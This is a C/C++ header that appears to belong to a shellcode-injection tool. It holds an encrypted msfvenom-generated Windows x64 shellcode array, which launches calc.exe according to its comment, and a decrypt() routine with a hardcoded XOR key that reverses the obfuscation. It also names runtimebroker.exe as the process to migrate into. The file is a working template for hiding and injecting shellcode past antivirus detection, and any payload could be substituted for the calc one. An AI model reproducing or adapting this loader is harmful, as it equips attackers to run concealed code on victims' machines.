#pragma once
//#include "MigleEarator.h"

const wchar_t* WHERETOMIGRATE = L"runtimebroker.exe";

//msfvenom  -p windows/x64/exec cmd=calc.exe -f raw -o OMGaCalc.raw
unsigned char rawData[] = {
0xb6,0xa,0xef,0xb1,0x99,0x8e,0x95,0x66,0x73,0x6e,0x29,0x40,0x21,0x25,0x3e,0x24,0x20,0xa,0x5d,0x87,0xe,0x2e,0xe0,0x38,0x13,0x26,0xe3,0x3d,0x7a,0x3d,
0xe5,0x21,0x6a,0xa,0xe7,0x27,0x39,0x2e,0x5c,0xd3,0x39,0x28,0x25,0x60,0xa9,0x3d,0x5f,0xb3,0xe6,0x7e,0xd,0x29,0x6b,0x4a,0x75,0x25,0xb4,0xa5,0x65,0x30,
0x61,0xb6,0x8e,0xa0,0x1c,0x1,0x3d,0x1d,0xe4,0x38,0x75,0xef,0x31,0x52,0x22,0x70,0xb2,0x0,0xf0,0xfb,0x4a,0x42,0x6e,0x1d,0xee,0xa6,0x21,0x3,0x3b,0x6d,
0xba,0x3f,0xeb,0x3d,0x78,0x37,0xc3,0x2,0x4e,0x1e,0x6a,0xb6,0xb8,0x34,0x3b,0x93,0xa1,0x30,0xeb,0x41,0xe8,0x3b,0x49,0x98,0x21,0x66,0xa2,0x2e,0x66,0xa6,
0xdf,0x2d,0xa9,0xa8,0x6d,0x36,0x6f,0xb4,0x72,0xa2,0x19,0xa6,0x25,0x67,0x19,0x42,0x7b,0x29,0x51,0xc0,0x15,0xad,0x38,0x37,0xc3,0x2,0x4a,0x1e,0x6a,0xb6,
0x33,0x25,0xfa,0x62,0x22,0x2b,0xeb,0x35,0x74,0x3c,0x49,0x92,0x2d,0xe0,0x6d,0xee,0x1d,0x65,0xa3,0x2d,0x32,0x30,0x3a,0x2b,0x37,0x29,0x9,0x1a,0x2d,0xe,
0x2a,0x40,0x1d,0xe7,0x9f,0x4e,0x29,0x3d,0x9f,0x95,0x38,0x34,0x11,0x1c,0x26,0xe0,0x7b,0x8d,0x4,0x9b,0x8e,0x93,0x35,0x27,0xdc,0x76,0x70,0x73,0x4a,0x42,
0x6e,0x55,0x69,0x2e,0xda,0xe9,0x74,0x6d,0x6a,0x6f,0x21,0xcf,0x5f,0xfa,0x27,0xc7,0x93,0x82,0xd4,0x96,0xe2,0xc8,0x25,0x2d,0xd4,0xc9,0xf5,0xca,0xf3,0x8e,
0x9d,0xa,0xef,0x91,0x41,0x5a,0x53,0x1a,0x79,0xee,0x93,0x8f,0x15,0x72,0xd5,0x36,0x5b,0x34,0x3,0x3f,0x69,0x3d,0x16,0xed,0xa9,0x93,0xbd,0xe,0x1,0x19,
0xd,0x5d,0x2d,0x3a,0x9,0x55
};

void decrypt()
{
    int codeLength = sizeof(rawData);
    char key[] = { 0x49, 0x41, 0x6d, 0x54, 0x68, 0x65, 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x6f, 0x72, 0x00 };
    int i;
    int keyLength = strlen(key);
    for (i = 0; i < codeLength; i++)
    {
        rawData[i] = rawData[i] - 1;
        rawData[i] = rawData[i] ^ key[i % keyLength];
    }
}